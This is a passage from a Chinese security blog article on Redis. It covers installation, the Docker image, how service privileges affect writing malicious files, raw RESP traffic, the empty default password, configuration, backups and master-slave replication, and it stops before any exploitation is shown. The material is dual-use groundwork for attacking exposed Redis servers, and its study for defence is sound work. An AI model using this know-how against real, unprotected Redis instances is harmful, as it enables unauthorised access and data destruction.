> 原文链接: https://www.anquanke.com//post/id/214108 


# 从0到1认识Redis到多维角度场景下的安全分析与利用


                                阅读量   
                                **192503**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0105a92b48c6ae81c2.jpg)](https://p0.ssl.qhimg.com/t0105a92b48c6ae81c2.jpg)



## 前言

`Redis`数据库安全性问题对于安全测试人员来说再熟悉不过了，这里将针对该数据库做一个基本的介绍和多维角度场景下的安全分析与利用探索。



## 基础

### <a class="reference-link" name="%E7%AE%80%E4%BB%8B"></a>简介

> REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。
Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。

Redis 与其他 key – value 缓存产品有以下三个特点：
- Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。
- Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
- Redis支持数据的备份，即master-slave模式的数据备份。
### <a class="reference-link" name="%E8%B5%84%E6%BA%90"></a>资源
- Redis官网
```
https://redis.io/
```
- Redis下载
```
# 最新版本下载
https://redis.io/download

# 各个版本下载
http://download.redis.io/releases/
```
- Redis命令指南
```
https://redis.io/commands
```
- Redis在线终端
```
http://try.redis.io/
```
- Redis官方文档
```
https://redis.io/documentation
```
- Redis官方docker
```
https://hub.docker.com/_/redis
```

### <a class="reference-link" name="%E9%83%A8%E7%BD%B2"></a>部署

<a class="reference-link" name="Windows%E4%B8%8B%E5%AE%89%E8%A3%85"></a>**Windows下安装**

```
https://github.com/tporadowski/redis/releases
```

Redis 支持 32 位和 64 位。这个需要根据你系统平台的实际情况选择。

下载相应版本解压即可，文件结构信息如下：

```
λ  Qftm &gt;&gt;&gt;: ls -al
total 58408
drwxr-xr-x 1 Qftm 197121        0  7月 19 10:01 ./
drwxr-xr-x 1 Qftm 197121        0  7月 19 10:01 ../
-rw-r--r-- 1 Qftm 197121   122700  5月  2 13:43 00-RELEASENOTES
-rwxr-xr-x 1 Qftm 197121     1536  5月  2 19:59 EventLog.dll*
-rw-r--r-- 1 Qftm 197121      991  2月  9 13:40 README.txt
-rw-r--r-- 1 Qftm 197121    48201  9月 22  2019 redis.windows.conf
-rw-r--r-- 1 Qftm 197121    48212  9月 22  2019 redis.windows-service.conf
-rwxr-xr-x 1 Qftm 197121   468480  5月  2 19:59 redis-benchmark.exe*
-rw-r--r-- 1 Qftm 197121  7147520  5月  2 19:59 redis-benchmark.pdb
-rwxr-xr-x 1 Qftm 197121  1858560  5月  2 19:59 redis-check-aof.exe*
-rw-r--r-- 1 Qftm 197121 12726272  5月  2 19:59 redis-check-aof.pdb
-rwxr-xr-x 1 Qftm 197121  1858560  5月  2 19:59 redis-check-rdb.exe*
-rw-r--r-- 1 Qftm 197121 12726272  5月  2 19:59 redis-check-rdb.pdb
-rwxr-xr-x 1 Qftm 197121   642560  5月  2 19:59 redis-cli.exe*
-rw-r--r-- 1 Qftm 197121  7532544  5月  2 19:59 redis-cli.pdb
-rwxr-xr-x 1 Qftm 197121  1858560  5月  2 19:59 redis-server.exe*
-rw-r--r-- 1 Qftm 197121 12726272  5月  2 19:59 redis-server.pdb
-rw-r--r-- 1 Qftm 197121     3317  5月  2 19:53 RELEASENOTES.txt
```

打开一个 cmd 窗口切换到解压的目录文件中，在终端启动redis服务

```
$ redis-server.exe redis.windows.conf
```

PS：这里也可添加redis环境变量，减少不必要的操作

这时候另启一个 cmd 窗口，原来的不要关闭，不然就无法访问服务端了。同样切换到 redis 目录下，在终端中运行redis客户端连接服务器

```
$ redis-cli.exe -h 127.0.0.1 -p 6379
```

<a class="reference-link" name="Linux%E4%B8%8B%E5%AE%89%E8%A3%85"></a>**Linux下安装**

```
# 最新版本下载
https://redis.io/download

# 各个版本下载
http://download.redis.io/releases/
```

使用以下命令下载，提取和编译Redis

```
$ wget http://download.redis.io/releases/redis-6.0.5.tar.gz
$ tar xzf redis-6.0.5.tar.gz
$ cd redis-6.0.5
$ make
```

编译成功之后src目录下就会生成相应二进制文件，使用以下命令启动redis服务和客户端的连接

```
# 启动Redis服务
$ src/redis-server

# 客户端连接
$ src/redis-cli -h 127.0.0.1 -p 6379
```

<a class="reference-link" name="Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85"></a>**Ubuntu下安装**

在 Ubuntu 系统安装 Redis 可以使用以下命令

```
$ sudo apt-get update
$ sudo apt-get install redis-server
```

启动Redis和客户端的连接

```
# 启动Redis服务

# 第一种方式：通过redis-server前台终端启动redis服务
→ Qftm :~/Desktop# redis-server

# 第二种方式：通过系统服务管理启动redis服务
 → Qftm :~/Desktop# service redis-server start
```

启动服务
- 第一种
```
→ Qftm :~/Desktop# redis-server 
1734:C 19 Jul 2020 04:45:56.556 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1734:C 19 Jul 2020 04:45:56.557 # Redis version=6.0.5, bits=64, commit=00000000, modified=0, pid=1734, just started
1734:C 19 Jul 2020 04:45:56.557 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
1734:M 19 Jul 2020 04:45:56.558 * Increased maximum number of open files to 10032 (it was originally set to 1024).
                _._                                                  
           _.-``__ ''-._                                             
      _.-``    `.  `_.  ''-._           Redis 6.0.5 (00000000/0) 64 bit
  .-`` .-```.  ```\/    _.,_ ''-._                                   
 (    '      ,       .-`  | `,    )     Running in standalone mode
 |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
 |    `-._   `._    /     _.-'    |     PID: 1734
  `-._    `-._  `-./  _.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |           http://redis.io        
  `-._    `-._`-.__.-'_.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |                                  
  `-._    `-._`-.__.-'_.-'    _.-'                                   
      `-._    `-.__.-'    _.-'                                       
          `-._        _.-'                                           
              `-.__.-'                                               

1734:M 19 Jul 2020 04:45:56.559 # Server initialized
1734:M 19 Jul 2020 04:45:56.559 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
1734:M 19 Jul 2020 04:45:56.560 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.
1734:M 19 Jul 2020 04:45:56.560 * Ready to accept connections
```
- 第二种
```
→ Qftm :~/Desktop# service redis-server start
 → Qftm :~/Desktop#
```

客户端连接

```
# 客户端连接
 → Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379&gt;
```

### <a class="reference-link" name="%E6%93%8D%E4%BD%9C"></a>操作

官方手册指令：[https://redis.io/commands](https://redis.io/commands)

> PS：针对下面的一系列操作，将同时开启wireshark抓取相关主机流量，分析客户端与服务端建立连接以及通信的详细过程。

<a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%90%AF%E5%8A%A8"></a>**服务端启动**

Redis数据库服务启动主要有两种方式：一种是通过注册系统服务方式来启动`$ service redis-server start`，另一种是通过redis自身工具来启动`$ redis-server`。对于这两种方式第一种通过系统软件包管理工具来安装redis的时候会自动注册到系统服务里面，第二种通过官方源码进行安装的时候通过源码里面的`redis-server`工具进行启动，不管哪种方式都是可以通过redis-server方式进行启动的。

那么这两种方式有什么不同的，为什么要重点说一下呢，第一种：如果通过系统服务方式启动redis的话，默认启动权限为redis用户；第二种：如果以`redis-server`方式启动redis的话，默认启动权限为当前系统终端用户权限。下面分别查看两种不同情况：
- **Linux环境**
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019f4291215cd77c6b.png)
- **Windows环境**
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014b9bc5c9a702876e.png)
- **Docker环境**
Redis官方docker镜像地址：[Dockerfile](https://hub.docker.com/_/redis?tab=description)、[Tags](https://hub.docker.com/_/redis?tab=tags)

当今容器化部署redis是一种再常见不过的方式了，但是使用容器启动单一的redis服务是以什么样的情况和什么样的权限启动呢，下面通过分析redis官方dockerfile关键部分解读这些疑问：

> Redis-5.0-dockerfile

```
FROM debian:buster-slim

# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get added
RUN groupadd -r -g 999 redis &amp;&amp; useradd -r -g redis -u 999 redis

# grab gosu for easy step-down from root
# https://github.com/tianon/gosu/releases
ENV GOSU_VERSION 1.12
RUN set -eux; \
    savedAptMark="$(apt-mark showmanual)"; \
    apt-get update; \
    apt-get install -y --no-install-recommends ca-certificates dirmngr gnupg wget; \
    rm -rf /var/lib/apt/lists/*; \
    dpkgArch="$(dpkg --print-architecture | awk -F- '`{` print $NF `}`')"; \
    wget -O /usr/local/bin/gosu "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$dpkgArch"; \
    wget -O /usr/local/bin/gosu.asc "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$dpkgArch.asc"; \
    export GNUPGHOME="$(mktemp -d)"; \
    gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4; \
    gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu; \
    gpgconf --kill all; \
    rm -rf "$GNUPGHOME" /usr/local/bin/gosu.asc; \
    apt-mark auto '.*' &gt; /dev/null; \
    [ -z "$savedAptMark" ] || apt-mark manual $savedAptMark &gt; /dev/null; \
    apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false; \
    chmod +x /usr/local/bin/gosu; \
    gosu --version; \
    gosu nobody true

ENV REDIS_VERSION 5.0.9
ENV REDIS_DOWNLOAD_URL http://download.redis.io/releases/redis-5.0.9.tar.gz
ENV REDIS_DOWNLOAD_SHA 53d0ae164cd33536c3d4b720ae9a128ea6166ebf04ff1add3b85f1242090cb85

RUN set -eux; \
    \
    savedAptMark="$(apt-mark showmanual)"; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        ca-certificates \
        wget \
        \
        gcc \
        libc6-dev \
        make \
    ; \
    rm -rf /var/lib/apt/lists/*; \
    \
    wget -O redis.tar.gz "$REDIS_DOWNLOAD_URL"; \
    echo "$REDIS_DOWNLOAD_SHA *redis.tar.gz" | sha256sum -c -; \
    mkdir -p /usr/src/redis; \
    tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1; \
    rm redis.tar.gz; \
    \
# disable Redis protected mode [1] as it is unnecessary in context of Docker
# (ports are not automatically exposed when running inside Docker, but rather explicitly by specifying -p / -P)
# [1]: https://github.com/antirez/redis/commit/edd4d555df57dc84265fdfb4ef59a4678832f6da
    grep -q '^#define CONFIG_DEFAULT_PROTECTED_MODE 1$' /usr/src/redis/src/server.h; \
    sed -ri 's!^(#define CONFIG_DEFAULT_PROTECTED_MODE) 1$!\1 0!' /usr/src/redis/src/server.h; \
    grep -q '^#define CONFIG_DEFAULT_PROTECTED_MODE 0$' /usr/src/redis/src/server.h; \
# for future reference, we modify this directly in the source instead of just supplying a default configuration flag because apparently "if you specify any argument to redis-server, [it assumes] you are going to specify everything"
# see also https://github.com/docker-library/redis/issues/4#issuecomment-50780840
# (more exactly, this makes sure the default behavior of "save on SIGTERM" stays functional by default)
    \
    make -C /usr/src/redis -j "$(nproc)" all; \
    make -C /usr/src/redis install; \
    \
# TODO https://github.com/antirez/redis/pull/3494 (deduplicate "redis-server" copies)
    serverMd5="$(md5sum /usr/local/bin/redis-server | cut -d' ' -f1)"; export serverMd5; \
    find /usr/local/bin/redis* -maxdepth 0 \
        -type f -not -name redis-server \
        -exec sh -eux -c ' \
            md5="$(md5sum "$1" | cut -d" " -f1)"; \
            test "$md5" = "$serverMd5"; \
        ' -- '`{``}`' ';' \
        -exec ln -svfT 'redis-server' '`{``}`' ';' \
    ; \
    \
    rm -r /usr/src/redis; \
    \
    apt-mark auto '.*' &gt; /dev/null; \
    [ -z "$savedAptMark" ] || apt-mark manual $savedAptMark &gt; /dev/null; \
    find /usr/local -type f -executable -exec ldd '`{``}`' ';' \
        | awk '/=&gt;/ `{` print $(NF-1) `}`' \
        | sort -u \
        | xargs -r dpkg-query --search \
        | cut -d: -f1 \
        | sort -u \
        | xargs -r apt-mark manual \
    ; \
    apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false; \
    \
    redis-cli --version; \
    redis-server --version

RUN mkdir /data &amp;&amp; chown redis:redis /data
VOLUME /data
WORKDIR /data

COPY docker-entrypoint.sh /usr/local/bin/
ENTRYPOINT ["docker-entrypoint.sh"]

EXPOSE 6379
CMD ["redis-server"]
```

添加group、gid、user、uid

```
RUN groupadd -r -g 999 redis &amp;&amp; useradd -r -g redis -u 999 redis
```

下载源码、安装

```
RUN set -eux; \
    wget -O redis.tar.gz "$REDIS_DOWNLOAD_URL"; \
    echo "$REDIS_DOWNLOAD_SHA *redis.tar.gz" | sha256sum -c -; \
    mkdir -p /usr/src/redis; \
    tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1; \
    rm redis.tar.gz; \
    \
    make -C /usr/src/redis -j "$(nproc)" all; \
    make -C /usr/src/redis install; \
    \
```

关闭安全模式

```
RUN set -eux; \
    grep -q '^#define CONFIG_DEFAULT_PROTECTED_MODE 1$' /usr/src/redis/src/server.h; \
    sed -ri 's!^(#define CONFIG_DEFAULT_PROTECTED_MODE) 1$!\1 0!' /usr/src/redis/src/server.h; \
    grep -q '^#define CONFIG_DEFAULT_PROTECTED_MODE 0$' /usr/src/redis/src/server.h; \
```

设置redis工作空间和权限

```
RUN mkdir /data &amp;&amp; chown redis:redis /data
VOLUME /data
WORKDIR /data
```

启动redis容器服务

```
COPY docker-entrypoint.sh /usr/local/bin/
ENTRYPOINT ["docker-entrypoint.sh"]

EXPOSE 6379
CMD ["redis-server"]
```

通过上面几个关键部分的解读，可以知道容器化的redis是以redis用户身份启动的，因为容器给redis添加了redis用户组和用户(gid、uid)，同时将redis工作空间设置为`/data`目录并附属redis用户组用户权限，最终的容器启动以`ENTRYPOINT &lt;CMD&gt;`的方式启动也就是当前redis用户权限身份，具体细节如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01fe5bcd2d88e4a14f.png)
- **安全性分析**
关于Redis服务端不同情况下启动说了那么多是为了什么，主要因为当Redis是以redis用户身份权限启动的话，这个时候redis服务权限会被限制在redis用户中，就无法向目标服务器特定目录写入恶意程序【即使特定目录设置redis用户及用户组或者目录权限777一样无法写入相应的文件，具体分析如下：

上面提到使用service系统服务管理方式启动redis默认以redis方式启动【注意：这里Linux系统是通过软件包管理器方式进行安装的redis数据库服务】，这里看一下有关服务启动具体细节

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c3df426642226704.png)

通过查看`/lib/systemd/system/redis-server.service`系统服务管理程序文件读取有关redis启动配置信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e16f45ff7744bc09.png)

从中可知redis服务启动使用redis用户及用户组，同时redis可读写目录被限制在上述特定目录之中，如果用户要是想使用其他目录作为数据备份目录则需要在其中添加`ReadWriteDirectories=-/xx/xxx`相关信息【如果不添加这些信息的话，所造成的问题：也就是上面所提到的即使有关目录设置redis所属用户及权限777也是无法向其中写入文件的】

**<a class="reference-link" name="%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5"></a>客户端连接**
- 客户端连接服务端
```
→ Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379&gt;
```
- 流量分析
客户端通过TCP三次握手与服务端成功建立连接：客户端端口：48550、服务端端口：6379

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019419d9fda4bcc37c.png)

<a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BF%A1%E6%81%AF"></a>**服务端信息**
- 通过info指令查看连接的服务端信息
```
127.0.0.1:6379&gt; info
# Server
redis_version:6.0.5
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:1c86537e5daf696
redis_mode:standalone
os:Linux 5.4.0-kali3-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:1807
run_id:96f07531683a498508026db78c043bf5699377c0
tcp_port:6379
uptime_in_seconds:5952
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:1319629
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:871664
used_memory_human:851.23K
used_memory_rss:12374016
used_memory_rss_human:11.80M
used_memory_peak:871664
used_memory_peak_human:851.23K
used_memory_peak_perc:100.18%
used_memory_overhead:825154
used_memory_startup:808168
used_memory_dataset:46510
used_memory_dataset_perc:73.25%
allocator_allocated:1191056
allocator_active:1515520
allocator_resident:3850240
total_system_memory:2081796096
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.27
allocator_frag_bytes:324464
allocator_rss_ratio:2.54
allocator_rss_bytes:2334720
rss_overhead_ratio:3.21
rss_overhead_bytes:8523776
mem_fragmentation_ratio:14.92
mem_fragmentation_bytes:11544872
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1595149197
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:2
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:48
total_net_output_bytes:37070
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:96
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0

# Replication
role:master
connected_slaves:0
master_replid:70ff7b2306f45655c4f92e1e4d5fbf1f9380289c
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:6.902410
used_cpu_user:5.210013
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
127.0.0.1:6379&gt;
```

<a class="reference-link" name="%E9%94%AE%E5%80%BC%E5%AF%B9%E6%93%8D%E4%BD%9C"></a>**键值对操作**
<li>设置键值对：`key：qftm`、`value：MaybeAHacker.`
</li>
```
127.0.0.1:6379&gt; set qftm MaybeAHacker.
OK
127.0.0.1:6379&gt;
```
- 流量分析
通过追踪TCP数据流`Follow-&gt;TCP Stream`查看客户端向服务端发送的数据以及服务端的响应数据信息

客户端的发送数据【这里显示的结果：`CRLF`回车换行已作用】

```
*3
$3
set
$4
qftm
$13
MaybeAHacker.

原始的数据流如下：
*3\r\n$3\r\nset\r\n$4\r\nqftm\r\n$13\r\nMaybeAHacker.\r\n
```

服务端响应数据【这里显示的结果：`CRLF`回车换行已作用】

```
+OK

原始的数据流如下：
+OK\r\n
```
- 取出键值对
```
127.0.0.1:6379&gt; get qftm
"MaybeAHacker."
127.0.0.1:6379&gt;
```
- 流量分析
客户端的发送数据

```
*2
$3
get
$4
qftm

原始的数据流如下：
*2\r\n$3\r\nget\r\n$4\r\nqftm\r\n
```

服务端响应数据

```
$13
MaybeAHacker.

原始的数据流如下：
$13\r\nMaybeAHacker.\r\n
```

<a class="reference-link" name="%E9%85%8D%E7%BD%AE%E6%93%8D%E4%BD%9C"></a>**配置操作**
- **获取配置**
获取redis配置文件`redis.conf`中的配置项及值

```
127.0.0.1:6379&gt; CONFIG GET *
  1) "rdbchecksum"
  2) "yes"
  3) "daemonize"
  4) "yes"
  5) "io-threads-do-reads"
  6) "no"
  7) "lua-replicate-commands"
  8) "yes"
  9) "always-show-logo"
 10) "yes"
、、、、、、、、
、、、、、、、、
281) "unixsocketperm"
282) "0"
283) "slaveof"
284) ""
285) "notify-keyspace-events"
286) ""
287) "bind"
288) "127.0.0.1 ::1"
289) "requirepass"
290) ""
127.0.0.1:6379&gt;
```
- **编辑配置**
可以通过修改 `redis.conf` 文件或使用`CONFIG set` 命令来修改配置。

```
127.0.0.1:6379&gt; CONFIG set key value
```

<a class="reference-link" name="%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"></a>**数据类型**

Redis支持五种数据类型

```
string（字符串）
hash（哈希）
list（列表）
set（集合）
zset(sorted set：有序集合)
```

具体每种数据类型的详细描述见：[Redis数据类型](https://www.runoob.com/redis/redis-data-types.html)

<a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E8%AE%A4%E8%AF%81"></a>**服务认证**

默认安装的redis数据库密码皆为空：`# requirepass foobared`，即客户端进行服务器连接时无需认证。

**redis设置密码的两种方法**
- 在redis-cli客户端连接成功时设置
```
127.0.0.1:6379&gt; config set requirepass 123456
```

这种方式设置完成之后无需重启，下次连接时即生效。
- 在终端执行命令修改redis.conf配置文件
```
sed -i 's/# requirepass foobared/requirepass 123456/g' /etc/redis/redis.conf
```

这种方法设置完之后需要重启redis服务

```
→ Qftm :~/Desktop# service redis-server restart
```

重启之后有两种方式可以进行认证：一种是在终端进行连接的时候后跟密码通过认证

```
→ Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379 -a 123456
```

另一种则是先连接然后再通过执行内部命令进行认证

```
→ Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379
127.0.0.1:6379&gt; AUTH 123456
OK
127.0.0.1:6379&gt; CONFIG GET requirepass
1) "requirepass"
2) "123456"
127.0.0.1:6379&gt;
```

<a class="reference-link" name="%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD"></a>**数据备份**

`Redis SAVE`命令用于创建当前数据库的备份，即：Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。

查看默认的数据库备份路径与文件名

```
127.0.0.1:6379&gt; config get dir
1) "dir"
2) "/var/lib/redis"
127.0.0.1:6379&gt; config get dbfilename
1) "dbfilename"
2) "dump.rdb"
127.0.0.1:6379&gt;
```

对内存数据进行备份、查看、加载

```
127.0.0.1:6379&gt; get qftm
"MaybeAHacker."
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt; 
 → Qftm :~/Desktop# vim /var/lib/redis/dump.rdb 
 → Qftm :~/Desktop# 
 → Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379 -a 123456
127.0.0.1:6379&gt; get qftm
"MaybeAHacker."
127.0.0.1:6379&gt;
```

清空数据库：即清空所有设置的key-value键值对

```
→ Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379 -a 123456
127.0.0.1:6379&gt; get qftm
"MaybeAHacker."
127.0.0.1:6379&gt; FLUSHALL
OK
127.0.0.1:6379&gt; get qftm
(nil)
127.0.0.1:6379&gt; 
 → Qftm :~/Desktop# redis-cli -h 127.0.0.1 -p 6379 -a 123456
127.0.0.1:6379&gt; get qftm
(nil)
127.0.0.1:6379&gt;
```

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"></a>**主从复制**

redis数据库不仅支持`save`模式的备份，同样支持master-slave模式的数据备份，即：主从复制。

主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的流向是单向的，只能由主节点到从节点。

默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BD%9C%E7%94%A8"></a>**主从复制作用**

```
为数据提供多个副本，实现高可用
实现读写分离（主节点负责写数据，从节点负责读数据，主节点定期把数据同步到从节点保证数据的一致性）
```

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%96%B9%E5%BC%8F"></a>**主从复制方式**
- 命令行slaveof
优点：无需重启。缺点：不便于管理

```
// 命令行使用
slaveof MasterIp MasterPort // 使用命令后自身数据会被清空，但取消slave只是停止复制，并不清空
```
- 修改配置文件
优点：统一配置。缺点：需要重启

```
// 配置文件中配置
slaveof ip port
slave-read-only yes //只允许从节点进行读操作
```

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6"></a>**主从复制-全量复制**

用于初次复制或其它无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作，当数据量较大时，会对主从节点和网络造成很大的开销
- slave和msater的握手机制
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01386262f845eb5175.jpg)

上图为slave在syncWithMaster阶段做的事情，主要是和master进行握手，握手成功之后最后确定复制方案，中间涉及到迁移的状态集合如下：

```
#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */
/* --- 握手状态开始 --- */
#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */
#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */
#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */
#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */
#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */
#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */
#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */
#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */
#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */
/* --- 握手状态结束 --- */
